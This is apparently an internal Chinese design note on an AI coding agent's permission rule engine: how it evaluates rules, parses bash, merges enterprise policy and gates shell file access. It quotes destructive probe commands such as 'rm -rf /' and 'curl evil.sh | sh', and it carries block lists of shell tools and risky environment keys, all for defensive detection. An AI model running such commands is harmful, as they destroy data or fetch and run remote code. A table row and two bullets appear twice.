# 新层：权限规则引擎独立成 crate（xai-grok-permission-rules）

主题：本次 merge（`git log -- crates/codegen/xai-grok-permission-rules` 只有 `97f190f6`/`2bdd1d6a` "Synced from monorepo"）
把原 `xai-grok-workspace/src/permission/` 的**规则层**整体搬进新 crate，并把 `WS/trust.rs`、`WS/folder_trust.rs`、
`WS/project_config.rs`、`WS/git_content_filters.rs`、`WS/util/mod.rs` 一并吸入（`git ls-tree f0e3be11` 里这些路径曾存在）。
实测规模：`find src -name '*.rs' | xargs wc -l` = **23387 行 / 38 文件**（含内嵌 `#[cfg(test)] #[path=…]` 测试文件）；
`tests/` 目录只有一个 fixture `tests/fixtures/enterprise-managed-settings-ga.json`（被 `R/managed_policy/tests.rs` 以
`include_str!` 引用，快照 :2193）。

约定：锚点 = `文件` · 符号：`Name`（+N 为符号体内相对偏移，+0 = 定义行；绝对行号写在括号里，标注「快照」）。
简称 `R/` = `crates/codegen/xai-grok-permission-rules/src/`，`WS/` = `crates/codegen/xai-grok-workspace/src/`，
`TOOLS/` = `crates/codegen/xai-grok-tools/src/`，`AGENT/` = `crates/codegen/xai-grok-agent/src/`。没读到源码证据的一律写「未确认」。

## 1. 职责与边界

- crate 自述：`R/../Cargo.toml` · `description` =「Grok's permission rule engine, apart from the session and tool code that
  uses it」；`R/lib.rs` · 模块 doc（+0，快照 :1-2）=「The agent, the tools, and the session code stay out, so a small
  consumer can link the rules alone」。`#![deny(clippy::indexing_slicing)]`（快照 :4）⇒ 全 crate 禁裸下标（多处
  `get(..7)?` 注释即为此）。依赖单向：本 crate 不依赖 workspace/tools/agent；`tokio` 只在 `[dev-dependencies]`
  ⇒ 规则层无 channel/任务/UI 类型。

| 谁做什么 | 权限规则层（新 `R/`，23387 行） | 会话/运行时层（留 `WS/permission/`，29975 行） |
|---|---|---|
| 规则数据与求值 | `R/types.rs`（`AccessKind` :4、`Decision` :29、`EditPolicy` :39、`PermissionConfig` :79、`PermissionRule` :107、`ToolFilter` :136、`RequirementSource` :151）+ `R/policy.rs · CompiledPolicy`（:82）及 `evaluate*` | workspace 侧仅 `WS/permission/types.rs:5` `pub use …::types::*`，本体只剩 `PermissionEvent`（:8）、`RequestPathContext`（:119）、`HookAsk`（:126）、`PermissionRequest`（:161）、`PermissionCommand`（:186）；manager 只调用（`WS/permission/manager/mod.rs` 7772 行，`PermissionHandle` :67 是 **enum** `Actor{..}|AllowAll`、`request` :269、`clamp_yolo` :318） |
| bash/shell 分析与读写门 | `R/bash_command_splitting.rs`、`R/bash_permission_script.rs`、`R/policy/bash_commands.rs`、`R/exec_risk.rs`、`R/env_risk.rs`、`R/shell_access.rs`（3372，`evaluate_shell_file_access_gate` :28、`ProtectedEditReason` :378） | `WS/permission/manager/{request_classification.rs(118),bash_policy_allow.rs}` 业务包装；消费 `GatePreflight` 后弹窗 |
| 预检合并 / 多源配置合并 / 企业 policy | `R/gate_preflight.rs · GatePreflight`（:15）、`R/resolution.rs · resolve_permissions_with_provenance`（:472）+ YOLO 锁（:912）、`R/managed_policy/`（7 文件 5343） | auto 分类器本体 `WS/permission/auto_mode/mod.rs`（3443）；状态落 `WS/permission/state.rs`（1535）；`WS/permission/managed_hooks.rs` 提供 `disabled_hooks_snapshot` 注入两个门面（`WS/permission/mod.rs`:11-14、:19-22） |
| 文件夹信任 | `R/folder_trust.rs`（纯判定）、`R/trust.rs`（store）、`R/worktree.rs`（**私有**只读 DB 副本）、`R/repo.rs`、`R/project_config.rs` | `WS/folder_trust.rs`、`WS/trust.rs` 交互与编排（re-export：`WS/folder_trust.rs:13`、`WS/trust.rs:4-5`） |
| 文件夹信任 | `R/folder_trust.rs`（纯判定）、`R/trust.rs`（store 落盘）、`R/worktree.rs`（**私有**只读 DB 副本）、`R/repo.rs`、`R/project_config.rs` | `WS/folder_trust.rs`、`WS/trust.rs` 交互与编排（re-export：`WS/folder_trust.rs:13`、`WS/trust.rs:4-5`） |
| 授权缓存 / 弹窗 / Hub 审批 / per-command 沙箱 | —（不参与） | `WS/permission/grants.rs`（1098）+`grants/bash_grants.rs`、`prompter.rs`（2182）、`hub_permission.rs`（683）+`hub_gate.rs`（399）、`sandbox_gate.rs`/`sandbox_network.rs`/`sandbox_wire.rs`（见 `new-sandbox-command.md`） |

一句话：**规则层 = 纯函数化的「配置 → 决策」；会话层 = 「决策 → 交互 → 状态」。**

## 2. lib.rs 对外 API（`R/lib.rs` 32 行：21 个 `pub mod` 快照 :6-26 + `mod worktree` 私有 :27 + `#[cfg(test)] mod test_support` :29-32）

| 模块 | 对外入口符号（+0 = 定义行，括号为快照绝对行） |
|---|---|
| `bash_command_splitting` | `try_parse_shell`（:42）、`unwrap_command_wrappers`（:622）、`normalize_command_words`（:670）、`primary_command_from_script`（:881）、`all_commands_from_script`（:914）、`BashCommandHighlights`（:5） |
| `bash_permission_script` / `git_content_filters` / `project_config` | `PermissionScript`（:38）·`analyze`（:46）；`content_filter_config_pins`（:143，其余 `pub(crate)`）；`find_project_configs`（:59）、`find_mcp_json_files`（:28）、`mcp_json_candidate_paths`（:14）、`MCP_JSON_FILENAME`（:10） |
| `claude_settings` | `ClaudeSettings`（:19）、`load_claude_settings`（:75）、`find_claude_settings_paths`（:318）、`project_claude_settings_present`（:354）、`load_claude_env_with_project`（:407）、`is_claude_import_marked`（:439）、`has_claude_compat`（:312） |
| `env_risk` / `domain` / `util` / `source_identity` / `reasons` / `repo` | `EnvRisk`（:20）+`env_key_risk`（:40）；`normalize_domain`（:3）；`path_present_or_uncertain`（:5）；`normalize_git_url`（:2）+`is_same_source_identity`（:8）；25 个 const（:1-25）+`ALL`（:27）；`RepoDirChain`（:14）+`resolve_under_home`（:27）+`canonical_or_raw`（:61） |
| `exec_risk` | `normalize_for_exec_risk`（:24）、`segment_exec_facts`（:216）、`git_words_are_read_only_query`（:316）、`local_repo_config_has_exec_risk`（:367）、`ambient_scan_plan_from_cmd`（:507）、`script_may_invoke_git`（:515） |
| `folder_trust` / `gate_preflight` | `decide`（:69）、`resolve_trust`（:83）、`DecideInputs`（:26）、`TrustOutcome`（:19）、`TrustResolution`（:53）、`TrustDurability`（:41）、`PromptPolicy`（:35）、`feature_enabled`（:128）、`folder_trust_inert`（:121）；`GatePreflight`（:15）、`evaluate`（:28）、`policy_decision`（:63）、`shell_forced_prompt`（:77）、`admits_auto_classifier`（:89）、`classifier_allowed_decision`（:95）、`prompt_trigger`（:116） |
| `managed_policy` | 见 §4.4：`ManagedSettings`（`mod.rs`:42）、`load_managed_settings`（:117）、`managed_settings`（:111）+ 子模块类型 |
| `policy` | `CompiledPolicy`（:82）、`CompiledRule`（:76）、`GateDecision`（:25）、`MatchContext`（:69）、`InlineShellScript`（:398）、`ShellWord`（:386）、`rule_is_catchall`（:880）、`combine_decisions`（:800）、`EXEC_VEHICLE_HEADS`（:592）；子模块 `policy::path_match`、`policy::bash_commands` |
| `resolution` | `resolve_permission_config_with_fallback`（**唯一 `pub async`**，:268）、`…_pinned`（:281）、`ResolvedPermissions`（:359）、`ProvenanceResolution`（:351）、`SkippedPermission`（:370）、`apply_permission_mode_hint`（:301）、`deny_read_globs_from_config`（:333）、`YoloPolicyLock`（:872）+`yolo_policy_lock`（:884）、`PERMISSION_MODE_ALWAYS_ALLOW`（:297）；`pub use` 再导出 12 个 managed_policy 符号（:729-735） |
| `rules` / `types` | `parse_permission_rule`（:109）、`DefaultPermissionMode`（:8）+`FromStr`（:18）、`RuleParseError`（:70）、`tool_name_to_filter`（:244）；types 见 §1 首行（+`PatternMode` :119、`RuleAction` :127、`PromptPolicy` :99、`Sourced<T>` :178） |
| `shell_access` | `evaluate_shell_file_access`（:21）、`ProtectedEditReason`（:378）、`ProtectedEditPermission`（:445）、`edit_target_protection`（:462）、`command_write_paths_split`（:321）+`WritePathsSplit`（:311）、`ShellFileMode`（:628）、`ExecutionScope`（:662）、`words_are_opaque_shell`（:1004） |
| `trust` | `TrustStore`（:101）、`workspace_key`（:391）、`is_unsafe_trust_root`（:438）、`Recorded`（:93）、`TrustPersistError`（:69）、`TRUST_FILE_NAME`（:32）、`trust_store_home`（:448）、`canonicalize_or_owned`（:452）、`is_home_dir`（:429） |

## 3. 数据流

**3.1 上游消费者**：`grep -rn "xai_grok_permission_rules::"`（排除本 crate）= **12 文件 / 28 处**，依赖声明在
`Cargo.toml:61`（member）与 `:364`（path），使用方 `WS/Cargo.toml:61`、`TOOLS/Cargo.toml:21`、`AGENT/Cargo.toml:29`。

| 消费者 | 用处（快照行） | 说明 |
|---|---|---|
| `WS/permission/mod.rs`（11 处） | :2-27 | **门面**：`pub use …::{bash_command_splitting, claude_settings, reasons, rules}`；`pub mod managed_policy { pub use …::managed_policy::* }`（:11-14）、`pub mod resolution { …::* }`（:19-22）⇒ 旧 `xai_grok_workspace::permission::*` 路径全部继续可编译 |
| `WS/permission/{types,auto_mode/mod,managed_hooks}.rs` | :5 / :19 / :3 | `types::*`、`env_risk::{EnvRisk,env_key_risk}`、`managed_policy::ManagedSettings` |
| `WS/{lib,folder_trust,trust,util/mod}.rs` | :21+:37 / :13 / :4-5+:107 / :3 | `git_content_filters`、`project_config`、`folder_trust::{…}`、`trust::{Recorded,TrustPersistError,trust_store_home}`、`path_present_or_uncertain` |
| `TOOLS/permission_access.rs`（4） | :1、:361-363 | `AccessKind`；测试块直接用 `CompiledPolicy`+`parse_permission_rule`+`Decision/PermissionConfig/RuleAction` ⇒ **工具层直连规则层，不经 workspace** |
| `TOOLS/…/web_fetch/domain.rs`、`AGENT/repo.rs`、`AGENT/plugins/mod.rs` | :17 / :5-:6 / :16 | `normalize_domain`、`RepoDirChain`+`canonical_or_raw`、`source_identity` |

**3.2 一次 Bash 请求在规则层内部的流**（自 `R/gate_preflight.rs` · `evaluate`（+0，快照 :28））：

```
AccessKind::Bash(cmd) + CompiledPolicy + cwd + auto_mode
 ├─ policy.evaluate_with_cwd_details → (direct, native_symlink_fail_closed)   [R/policy.rs :228]
 ├─ policy.evaluate_bash_command_gate [R/policy.rs :146]
 │    └─ evaluate_bash_command_segments [R/policy/bash_commands.rs :29]
 │         ├─ bash_command_splitting::all_commands_from_script（tree-sitter，:42）
 │         └─ 失败 → PermissionScript::analyze（recovered projections，:46）
 ├─ policy.evaluate_shell_file_access_gate(cmd, cwd) [R/shell_access.rs :28]
 │    └─ try_parse_shell → invocations / redirects / cwd-poison → evaluate_shell_path（escalate-only :186）
 └─ 汇总 rule_match_ask / fail_closed_ask / defers_gate_ask（gate_preflight :45-52）
→ WS manager 据 policy_decision / shell_forced_prompt / admits_auto_classifier 决定 拒绝 / 弹窗 / 交给 LLM 分类器
```

**3.3 下游依赖**（`R/../Cargo.toml`）：`tree-sitter`（workspace；根 `Cargo.toml:305` = 0.26）+ `tree-sitter-bash = "0.25"`
（`Cargo.lock` 快照 :11470-11471 → 0.25.0）、`git2 0.20`（`default-features=false, vendored-libgit2`）、`rusqlite 0.37`
（`bundled`）、`glob 0.3`、`fs2`、`dunce`、`url`、`serde/serde_json(preserve_order)`、`toml(preserve_order)`、`tempfile`、
`tracing`、`agent-client-protocol`（`ProtectedEditPermission` 走 ACP `_meta`）、`xai-dirs`、`xai-grok-config`、
`xai-grok-paths`（`normalize_lexically`）、`xai-grok-version`、`xai-sqlite-journal`（WAL 只读打开）。
**tree-sitter 唯一实例化点**：`R/bash_command_splitting.rs` · `try_parse_shell`（:42；`use tree_sitter_bash::LANGUAGE as BASH` :2，
`set_language(…).expect("load bash grammar")` :46）——全 crate 无第二个 `tree_sitter::Parser::new()`。

## 4. 核心机制拆解

### 4.1 CompiledPolicy：deny > ask > allow，顺序无关（`R/policy.rs` 2597 行 / 61 test）

- 字段（+0，快照 :82）：`config`、`matchers: Vec<Option<glob::Pattern>>`、`has_file_restrictions`、
  `has_bash_command_restrictions`、`has_bash_allow_rules`、`catchall`；`new`（:99）在编译 glob 前过滤掉 pattern `"*"`。
- **成功路径**：`evaluate_rules_with_base`（:275）先扫 Deny 并带出处文案
  `"Denied by permission policy: deny rule on {tool_label} matching \"{pattern}\""`（:307-313）→ 记 ask 标志（:315）→
  Bash 走**合取 allow**（:324-331），其他工具命中一条 allow 即 Allow（:332）。`combine_decisions`（:800）+
  `decision_rank`（:791，Reject/PolicyDeny=3 > Ask=2 > Allow=1）⇒ 有 ask 规则时 allow 不能翻盘。
- **失败路径同等重要**：`SymlinkFollow::Unresolvable` 且存在限制 ⇒ `(Ask, true)`（:259-261）并置
  `native_symlink_fail_closed`（**封锁 YOLO**，§4.3）；`evaluate_command_words`（:155）在 split 预算耗尽 / 歧义 /
  `env_options_uncertain` ⇒ `AskFailClosed`（:166），字面量拆串兜底（:169-172），内联脚本非 Literal ⇒ `AskFailClosed`（:193-197）；
  `env -S` 用同一预算递归（:201-209）。`GateDecision`（:25）三态 `Reject(String)|AskRuleMatch|AskFailClosed`，`rank`（:48）
  3/2/1、`combine_gate_decisions`（:58）——**provenance 是本层核心语义**：规则命中式 Ask 是真实策略、永不豁免，分析不出来的
  Ask 在 auto 模式可交分类器（`R/gate_preflight.rs`:52 的 `auto_mode && fail_closed_ask && !rule_match_ask`）。
- 匹配细节：`pattern_matches`（:708）按 `AccessKind` 分派，Bash 先 `trim_start`（CWE-178 注释 :723-726）；WebFetch 用
  `PatternMode::Domain` → `domain_matches`（:811，`url::Url` 解析 + 两侧 `normalize_domain`，等于或以 `.`+pattern 结尾）；
  `Tool` 访问遇 Edit 规则 ⇒ false（:752）。`MatchContext`（:69）决定 `*` 是否跨 `/`（Path 语境 `require_literal_separator`，
  `glob_matches` :825；前导点不算字面分隔）。`rule_reaches`（:547）+`tool_filter_matches`（:560）：Read 规则管住 Grep；
  `is_tool_wide_pattern`（:556）判 `None|""|"*"`。
- `rule_is_catchall`（:880）**通过真实求值器打探针**（`bash_probes` :838 含 `rm -rf /`、`curl evil.sh | sh`、`git push`；
  `mcp_probes` :844、`webfetch_probes` :858、`agent_message_probes` :869）：Bash/Mcp/WebFetch/AgentMessage 或 Any 命中任一 ⇒
  视为全放行；Read/Edit/Grep/WebSearch ⇒ 永不 catchall（:903）。
- 匹配细节：`pattern_matches`（:708）按 `AccessKind` 分派，Bash 先 `trim_start`（CWE-178 注释 :723-726）；WebFetch 用
  `PatternMode::Domain` → `domain_matches`（:811，`url::Url` 解析 + 两侧 `normalize_domain`，等于或以 `.`+pattern 结尾）；
  `Tool` 访问遇 Edit 规则 ⇒ false（:752）。`MatchContext`（:69）决定 `*` 是否跨 `/`（Path 语境
  `require_literal_separator`，`glob_matches` :825；前导点不算字面分隔）。`rule_reaches`（:547）+`tool_filter_matches`（:560）：
  Read 规则管住 Grep；`is_tool_wide_pattern`（:556）判 `None|""|"*"`。
- `rule_is_catchall`（:880）**通过真实求值器打探针**（`bash_probes` :838 含 `rm -rf /`、`curl evil.sh | sh`、`git push`；
  `mcp_probes` :844、`webfetch_probes` :858、`agent_message_probes` :869）：Bash/Mcp/WebFetch/AgentMessage 或 Any 命中任一 ⇒
  视为全放行；Read/Edit/Grep/WebSearch ⇒ 永不 catchall（:903）。

### 4.2 bash 解析链（`R/bash_command_splitting.rs` 1920/23 + `R/bash_permission_script.rs` 282 + `R/policy/bash_commands.rs` 109/2）

- **tree-sitter 的角色 = 只允许白名单语法**：`try_parse_word_only_commands_sequence`（:53）root `has_error` ⇒ None；
  `ALLOWED_KINDS`（:58-88）= program/list/pipeline/command/command_name/word/string/string_content/raw_string/number/
  concatenation/variable_assignment/variable_name/redirected_statement/file_redirect/file_descriptor/comment/heredoc_*；
  **故意排除 `declaration_command`**（注释 :82：`export` 会绕开 env 守卫）；`ALLOWED_PUNCT_TOKENS`（:92-94）只有
  `&& || ; | " ' = > >> < << >& &> &>>`，未知标点含 `&;|` ⇒ None（:113）。
- **剥壳与固定点**：`strip_wrapper_command`（:459）覆盖 `timeout`（`-k/-s/--kill-after/--signal` 各吃 2 且必须带 DURATION，
  :465-480）、`nice -n/--adjustment`、`stdbuf -i/-o/-e`、`ionice -c/-n/-p/-P/-u`、`chrt`（必带 PRIORITY）、`env`
  （`scan.has_split_string || options_uncertain` ⇒ **拒绝剥离** :540-543）；`peel_transparent_prefixes`（:639）剥
  `exec/command/builtin`，歧义 ⇒ `TransparentPrefixPeel::Ambiguous`（:628）。预算：`MAX_WRAPPER_DEPTH=8`（:564）、
  `MAX_TRANSPARENT_PREFIX_DEPTH=8`（:633）、`MAX_NORMALIZE_ROUNDS=16`（:635）、`MAX_INLINE_SHELL_DEPTH=8`（:566，**独立**预算）；
  `unwrap_wrappers_checked`（:579）在第 9 个可剥壳仍在时记 `exhausted`（:609）⇒ 上层 fail-closed；
  `normalize_command_words`（:670）交替固定点，遇 split_string/uncertain 提前停（:690-692）；`env_split_string_script`（:446）
  专防 `env $UNTRUSTED` 拆串；`parse_plain_command_from_node`（:921）只接受 word-only 序列（跳 `variable_assignment` :934）。
- **内联脚本分类**：`shell_dash_c_script`（:420）认 `bash|sh|dash|zsh|ksh`（:424）→ `InlineShellScript::Literal(idx)`
  （枚举 :398，doc :400-407）；`-c` 后 `--`/`-` 取下一字面量（:457-468）；`--init-file/--rcfile` 吃参数、
  `--noprofile/--norc/--posix` 放行、其他长选项继续扫（:479-498）；`-o/-O` 按 arity（:500-518）；扫完 `saw_c` ⇒ `Untrusted`（:533）。
- **合取 allow**：`bash_chain_fully_allowed`（:58）要求每个 peel 后段各自命中 allow：段空 ⇒ false（:69-71）、normalize 见
  flag 风险 ⇒ false（:74-80）、`-c` Literal 递归（:86-98）、Untrusted/Unrecognized ⇒ false（:100）。
  `narrow_allow_authorizes`（`R/policy.rs`:341）+`bash_words_allowed`（:353）在 NarrowOnly 下：exec-vehicle 头直接 false（:361）、
  catchall 规则跳过（:371）——`EXEC_VEHICLE_HEADS`（:592，~40 个头，含 sh/bash/zsh/dash/ksh/fish/deno/bun/nodejs/pythonw/npx/
  bunx/pipx/uvx/uv/awk/lua/xargs/find/sudo/doas/su/ssh/watch/setsid/flock/chroot/nsenter/docker/podman）+
  `EXEC_VEHICLE_HEAD_FAMILIES`（:607，python/node/ruby/perl/php/lua + 数字点号后缀；`normalized_command_head` :610 取 basename、
  小写、剥 `.exe`）⇒ 宽规则不能替 `bash -c` 里每条子命令背书。
- **失败/降级**：`evaluate_bash_command_segments`（:29）grammar 失败时试 `recovered_commands`（:14，covered 条件 =
  `is_eligible` 且每个 projection 都 `bash_words_allowed`）；两者皆败 ⇒ `AskFailClosed`（:37）。恢复解析的纪律见
  `R/bash_permission_script.rs` doc（:1「never creates saved grant scopes」）：`analyze`（:46）预算 `MAX_NODES=4096`（:47）、
  要求 complete + 至少一个未解析操作数 + 赋值变量必须被使用（:141-144）；含 `* ? [ ~` 的词 ineligible（:107-113）；
  前导赋值仅当值为 `/`|`./` 字面路径前缀才合格（:82）且不在 `WITNESS_DENIED_KEYS`（:11-25：RIPGREP_CONFIG_PATH、GCONV_PATH、
  `LD_` 前缀 :27…）且 `env_key_risk != Injection`；`readers_allow`（:219）只放 `ls|rg|echo|head|tail` 并逐 flag 校验；
  `quoted_filename`（:181）防 `"--pre=$LOG"` 被当选项。

### 4.3 gate_preflight（`R/gate_preflight.rs` 280 行 / 3 test）

结构体 5 字段（:15-24）把三来源显式化：`direct`、`bash_command`、`shell_file`、`native_symlink_fail_closed`、
`defers_gate_ask`。判定面：`policy_decision`（:63 三级 combine）、`policy_forced_prompt`（:72）、`shell_forced_prompt`（:77，含
symlink fail-closed，注释即「blocks YOLO」）、`shell_file_forced_prompt`（:84，挡住 bash grant 满足由 shell 升级来的 Read/Edit
ask）、`admits_auto_classifier`（:89 = 无强制 Ask 或可延迟）、`classifier_allowed_decision`（:95：分类器 Allow 之后 deny 仍
Reject、**任何 Ask 仍 Ask**（含 fail-closed，因为它可能藏着被禁命令））、`prompt_trigger`（:116 出 telemetry reason，规则命中式
Ask 保留 gate 标签、可延迟的不保留）。测试含 `native_unresolvable_symlink_forces_shell_prompt`（符号链接环，:229-279）。

### 4.4 managed_policy（`R/managed_policy/` 7 文件 5343 行 / 35 test）

- 分层与权威：`layer.rs` · `PolicyLayerTier`（:9）`Ord` = Mdm < SystemRequirements < SystemManaged < UserRequirements <
  UserManaged < Vendor（**越小越权威，strictest-wins**）；`authority`（:23）只有 Vendor ⇒ `Advisory`；`ownership`（:32）
  `User*` ⇒ User，其余 Admin；`PolicyPin`（:63）只可收紧（`Disabled{source,ownership}`，`is_disabled` :75）；
  `accepts_grant_from`（:99）：Admin 限制只接受 Admin 授权。
- 装载：`mod.rs` · `load_managed_settings`（:117）= vendor `xai_grok_config::claude_managed_settings_path()`（:118）+
  `managed_config_layers()` + `requirements_layers()`（:120-123）；`resolve_managed_settings`（:162）按 tier 排序（:170），
  **仅 `MANAGED_POLICY_CONFIG_KEYS`（`parse.rs`:199-216，16 个 camel+snake 拼写）允许跨 TOML→JSON**（:174-183）；serde 失败 ⇒
  `apply_unreadable_policy_source`（:220）＝空 allow + lockdown + marketplace 零 URL + 三个 pin 全挂；vendor JSON **不过滤、
  最后应用**（:201-205）；`pin_disabled`（:239-247）允许 admin 层把 user pin 升级为 admin pin；`engages_on`（:90）：
  ProjectMcp/PluginAutoUpdate 在 `false` 时生效、NonManagedHooks 在 `true` 时生效。
- 双拼写不一致 = Malformed：`parse.rs` · `policy_bool`（:16）camel/snake 同时出现且不同意 ⇒ fail_closed 值生效（:24-32），
  非 bool ⇒ fail_closed（:43-46）；`PolicyKey`（:238）`Absent|Malformed|Present` + `locks_down`（:268）。
- MCP allow/deny **非对称**：`mcp.rs` · `McpServerAllowlist`（:39）把 matcher 与 entry 同存（:56-64 防漂移）；
  `mcp_transport_known`（:124）新 ACP transport ⇒ fail closed，`mcp_entry_restricts`（:136）未知 transport 被每个 entry 视为受限；
  `allows_ignoring_managed_only`（:228）lockdown 什么都不放；`is_server_denied`（:268）未知 transport + 任意 deny ⇒ denied
  （:277-279）；`grants_exception`（:387）授权可来自任意 authority（grant 只放宽、不约束）；`mcp_name_matches`（:308）只精确相等、
  永不子串、空不匹配，`MANAGED_MCP_PREFIX="grok_com_"`（:291）+ 39 字符上限（:296）只在精确命中上限时镜像截断（:326-328）；
  `PolicySubjectOrigin`（:14）GrokNative 不受 advisory 约束，判不清按 Foreign（fail closed）。
- URL：`url_match.rs` allow 侧 `AllowUrlMatcher`（:240）、`SUPPORTED_REMOTE_SCHEMES=["http","https"]`（:251）、裸 `*` =
  `AllowScheme::Any`、空/半截 glob ⇒ `Never`，host 与 port 分离（`AllowAuthority` :288，无 pattern port 只匹配 scheme 默认端口）、
  IPv6 按解析后地址比（:611）；deny 侧 `DenyUrlMatcher`（:649）doc =「deny must never fail open」且与 scheme/port 无关，
  `RuntimeUrl::parse` 失败 ⇒ **直接 deny**（`matches` :711，:715-717）；`DenyPath::HostOnly`（:671）阻断所有规范化 `/` 拼法，
  glob 解析坏 ⇒ `Broken` 拒整台 host；空段折叠只用于 deny（:750-751）。
- 结论：`verdict.rs` · `mcp_verdict`（:113）顺序 deny → lockdown|not-granted → project pin → Allowed；`McpBlockReason`（:20）
  四类 + `rule()`（:56）固定文案 + `user_facing_source`（:45）只露文件名。`marketplace.rs` · `is_lockdown`（:27，零 URL 即锁）、
  `MarketplacePolicy::is_url_allowed`（:84）origin-aware；git URL 身份经 `normalize_git_url`（`R/source_identity.rs`:2）只折叠
  scheme/host 大小写并去 `.git`（注释 :1：小写 path 会把 allowlist 放宽到别的 repo）。

### 4.5 配置合并与 YOLO pin（`R/resolution.rs` 938 + `R/resolution_tests.rs` 2994/109）

- 层序（`resolve_permissions_inner`（:488）实际读取）：`requirements` → `managed.permissions` → managed `defaultMode` 合成规则
  → `managed_config` → `~/.grok/config.toml` + 项目 `.grok/config.toml`（`load_config_toml_permissions` :211：global 用
  `user_grok_home` :216，项目侧要求 `project_trusted` :233 并经 `find_project_configs`）→ `.claude/settings*.json`
  （trust 门控 + import marker 可整块跳过 :511）。managed 的 `defaultMode` **压过** user tier（:503-507 `SkipManagedOwns`）；
  `prompt_policy` 只在 managed 未给时取 user（:551）。
- **成功路径**：返回 `ResolvedPermissions`（:359）含 rules + provenance + skips；只有「rules 空 **且** Ask **且** 无 skip **且**
  未配置 default_mode」才返回 `None`（:568-574）。`synthetic_rules_for_default_mode`（:28）：bypass 被挡 ⇒
  `SkippedPermission`（:370），否则 Any catch-all Allow（:51-56）；acceptEdits ⇒ Allow Edit（:60-65）。
- **收紧/失败路径**：`drop_untrusted_catchall_allows`（:412）在 YOLO pin 生效时丢掉非 admin 来源的 catch-all allow
  （`is_admin_source` :403 = SystemRequirements|ManagedSettings；`is_catchall_allow` :388 复用 §4.1 探针）；被跳过的层记
  `SkippedPermission` 并保留（:681-688）。`parse_default_mode_claiming_scope`（:72）：无法识别的 mode ⇒ 回落 Default
  **但仍声明 scope**（防下层被误认为未设）。
- YOLO 锁：`resolve_yolo_policy_block`（:912）逐层看 `[ui] disable_bypass_permissions_mode=true`，兼容 legacy `[ui] yolo=false`
  （仍锁）；非 bool ⇒ warn 且**不加锁**（`requirements_lock_bool` :895）；锁文案两条面向管理员（`YoloPolicyLock::message` :857）；
  `claude_bypass_lock_request`（:840）明确「advisory only，resolver 不据此强制」——**实际强制在 WS**（`clamp_yolo` :318）。
  `apply_permission_mode_hint`（:301）：`PERMISSION_MODE_ALWAYS_ALLOW="alwaysAllow"`（:297）之外不识别即拒（:307）、有 pin 即拒
  （:311）、显式 `default_mode_configured` 优先（:319-325）、否则置 `PromptPolicy::Allow`（:326）；`deny_read_globs_from_config`
  （:333）把 `Read|Grep|Any` 的 deny pattern 交给付费快路径。
- Claude 兼容（`R/claude_settings.rs` 464）：`load_claude_settings`（:75）先 `metadata().is_file()` **拒读非普通文件**（注释 :76：
  FIFO 会阻塞 session actor）；`extract_default_mode`（:134）——嵌套 `permissions.defaultMode` 存在但类型错 ⇒ warn 且**不回落根键**
  （:141-147），根 `defaultMode`/`additionalDirectories` 只是 grok legacy（:170-207 同样不复活）；`env` 数字/布尔强转字符串、
  null/array/object 跳过并 warn（`extract_string_map` :240，注释 :239：不把 null 变成 `"null"`）；发现式
  `collect_project_claude_paths`（:362）从 cwd 走到「存在 `.git`」的 root（**不用 git2 校验**，注释 :361），`$HOME` 本身是 repo
  时丢弃该 root（:365-367）；`claude_settings_paths_for_trust`（:342）= 可信走全树、不可信只取 `~/.claude` user tier（:330-338），
  env 注入与权限解析共用同一函数（注释 :341「cannot drift」）；`project_claude_settings_present`（:354）用
  `path_present_or_uncertain`（类型无关：路径是目录也要翻不可信）；marker `is_claude_import_marked`（:439）读
  `[claude_compat].imported` + 测试后门 `_GROK_CLAUDE_MARKER_OVERRIDE=1`（:442），`is_claude_import_marked_with_log`（:450）
  每进程只 info 一行。
- 规则字符串语法（`R/rules.rs` 350/2）：`parse_permission_rule`（:109）转义感知括号切分（`is_unescaped` :261、
  `find_first/last_unescaped` :271/:280、`unescape_rule_content` :288）；空/`*` 内容 ⇒ tool-wide（pattern None）；显式不支持
  `EnterWorktree/NotebookEdit/NotebookRead`（:152-159、:190）；`Bash cmd:*` 剥前缀（`strip_bash_colon_wildcard` :307 只认尾随
  `:*`）、`domain:` 前缀（:298）、裸 `mcp__…` 重写（:207-227：`mcp__*`→tool-wide、`mcp__a__b`→原样、`mcp__a`→`a__*`）、未知裸
  token ⇒ `ToolFilter::Any` + pattern。`DefaultPermissionMode::FromStr`（:18）认 `default/acceptEdits/plan/auto/dontAsk/
  bypassPermissions`，`effects`（:35）映射 `PromptPolicy::Deny/Auto` + 两个 flag。`ToolFilter::AgentMessage` serde 名
  `agent_message` 且 alias `agentmessage`（`R/types.rs`:136 起）；`RequirementSource::Display`（:161）给每层打标签；
  `AccessKind::Tool`（:25）注释 = 无 grant scope 覆盖，每次调用都弹窗。

### 4.6 shell 访问门与受保护编辑路径（`R/shell_access.rs` 3372 = 代码 ~1344 + 51 test）

- 模块 doc（:1）：防「用 shell 绕过 Read/Edit deny/ask」。`inner`（:40）：解析失败 ⇒ `entered_inline.then(AskFailClosed)`
  （:48-50，畸形脚本地板只对**递归进入**的脚本生效 :54）；收集 `shell_command_invocations`/`shell_redirect_targets`/
  `cwd_poison_positions`（`cd|pushd|env -C`，:57-61）；重定向目标歧义 ⇒ forced_ask（:63-75）；每个 invocation 先过四个地板
  （exhausted / split_string / env_options_uncertain / transparent_ambiguous，:78-86）；`-c` 递归（:92-114，
  Untrusted|Unrecognized ⇒ forced_ask）；`cd/pushd/popd` 跳过（:125-127）。
- 程序分派：`special_file_operands`（`dd of=`、`sort|go|rustc -o`、`git --output`，:136-144）、`path_operands`
  （cp/mv/ln/install 目标、rm/touch，:148-159）、reader/writer 名单 + `sed -i` ⇒ Read+Write（:160-167，枚举 `ShellFileMode` :628）、
  `shell_reader_can_recurse`（`-r` 地板 :179-181）。
- **escalate-only 是硬规则**：`evaluate_shell_path`（:186）对 lexical / anchored / symlink-target 三形态重评时**丢弃 Allow**
  （:205-212）；`cwd_unpinned` ⇒ 只做文本比对并对相对路径返回 AskFailClosed（:240-258）。路径形态与 symlink 在
  `R/policy/path_match.rs`：`RuleBase`（:9，`OnceCell` 缓存物理形态 + `without_physical` :27）、`path_match_forms`（:53，含
  cwd 相对与 `./` 形态；含 `..` 时抑制物理 cwd 形态 :59-61）、`is_tilde_path`（:106 **永不与 cwd 拼接**，注释：造出的
  `./~/…` 会满足 `./**`）、`resolve_following_symlinks`（:161，`MAX_SYMLINK_DEPTH=40` :163；dangling leaf 先解析父目录；
  非 NotFound 的 metadata 错误 ⇒ None fail-closed :177-181）、`SymlinkFollow`（:199）+`follow_absolute_symlink`（:205）。
